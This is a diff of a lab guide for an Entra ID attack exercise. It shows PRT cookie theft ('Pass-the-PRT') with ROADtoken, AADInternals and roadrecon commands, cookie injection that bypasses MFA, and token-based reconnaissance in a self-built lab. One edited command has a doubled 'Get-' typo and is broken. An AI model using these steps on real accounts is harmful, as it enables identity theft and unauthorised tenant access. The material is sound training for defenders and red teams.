@@ -3,7 +3,7 @@
 ### Prepare a victim user with high privileges:
 
 1. RDP and login to the Win11 VM using the user `user1@YOURDOMAIN.onmicrosoft.com`
-2. run `dsregcmd /status` and make sure you see `AzureAdPrt : YES`
+2. run `dsregcmd /status` and make sure you don't have "invalid".. fields, and that you see `AzureAdPrt : YES`
    ![prt](prtexists.png)
 
 3. Make sure you are verified:
@@ -17,7 +17,7 @@
 
 From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Win 11 VM
 
-## 1. Steal-the-PRT-Cookie
+## 1. Steal-the-PRT-Cookie (a.k.a as "Pass-the-PRT" attack)
 
 **Notes:** 
 - This method will bypass MFA only if the user has authenticated using MFA in its Windows
@@ -31,51 +31,11 @@ Download from inside the Win11 VM [ROADToken.exe](https://github.com/shackcrack0
 Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
 
 ```powershell
-# download Firefox and install automatically
-$ProgressPreference = 'SilentlyContinue'    
-$firefoxUrl = "https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US"
-$destination = "$env:TEMP\firefox_installer.exe"
-Invoke-WebRequest -Uri $firefoxUrl -OutFile $destination -UseBasicParsing -Force
-Start-Process -FilePath $destination -ArgumentList "/S" -Wait
-Remove-Item $destination
-
-
-# Define the download URL and the paths
-$zipUrl = "https://github.com/mozilla/geckodriver/releases/download/v0.35.0/geckodriver-v0.35.0-win32.zip"
-$tempZipPath = "$env:TEMP\geckodriver.zip"
-$extractPath = "$env:TEMP\geckodriver"
-$destinationPath = "C:\Windows"
-
-# Download the ZIP file
-Invoke-WebRequest -Uri $zipUrl -OutFile $tempZipPath -UseBasicParsing
-
-# Create a temporary folder to extract the ZIP file
-New-Item -Path $extractPath -ItemType Directory -Force
-
-# Extract the ZIP file
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($tempZipPath, $extractPath)
-
-# Move the extracted files to the destination
-Move-Item -Path "$extractPath\*" -Destination $destinationPath -Force
-
-# Clean up the temporary files
-Remove-Item $tempZipPath
-Remove-Item $extractPath -Recurse
-
-Write-Output "Geckodriver has been downloaded, extracted, and placed in $destinationPath"
-
-```
-
-```powershell
 # Get the nonce first
 roadrecon auth --prt-init
 
 # Get a new PRT Cookie
 .\ROADtoken.exe <nonce>
-
-# this will AUTOMATICALLY open a browser and log in as that user (!)
-roadtx browserprtauth -url https://entra.microsoft.com --prt-cookie <eyJh... PRT COOKIE>
 ```
 
 #### Option 2: Steal PRT Cookie using RequestAADRefreshToken.exe tool
@@ -102,7 +62,7 @@ Use BrowserCore.exe to request a new PRT cookie with the current existing authen
 ```powershell
 Import-Module AADInternals
 # Get the PRToken
-$prtToken = Get-AADIntUserPRTToken
+Get-AADIntUserPRTToken
 ```
 
 ### Once PRT Cookie is in your possession:
@@ -114,7 +74,8 @@ It's time to steal that user identity:
 3. Delete ALL cookies and then add one named `x-ms-RefreshTokenCredential` and set its value to the JSON Web Token (JWT) in the `Data` field from RequestAADRefreshToken.exe output
 4. Refresh the page (or visit https://myapps.microsoft.com again) and you'll be logged it
 
-See demo video [here](stealPrtCookie.mp4)
+- if it asks for a password, it means the PRT in the victim computer is invalid: you should restart and re-login as `user1@YOURDOMAIN.onmicrosoft.com` and make sure you're authenticated to Windows properly (you account is active)
+**See demo video [here](stealPrtCookie.mp4)**
 
 # Next Step - Reconnaissance
 
@@ -128,11 +89,12 @@ roadtx browserprtauth --prt-cookie $prtToken # this will automatically get new a
 
 # method 2:
 $prtToken = Get-AADIntUserPRTToken
-roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken
+roadrecon auth -r aadgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken
 
 # method 3:
-$at = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
-roadrecon auth --access-token $at # AT for msgraph is needed
+$prtToken = Get-AADIntUserPRTToken
+$at = Get-Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
+roadrecon auth --access-token $at # AT for aadgraph is needed
 
 # Once you got an access token, look at it
 type .roadtools_auth
@@ -168,5 +130,4 @@ Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-168
 
 Get-AzureADUser
 ```
-
 ### Feeling comfortable? go to the next lab!
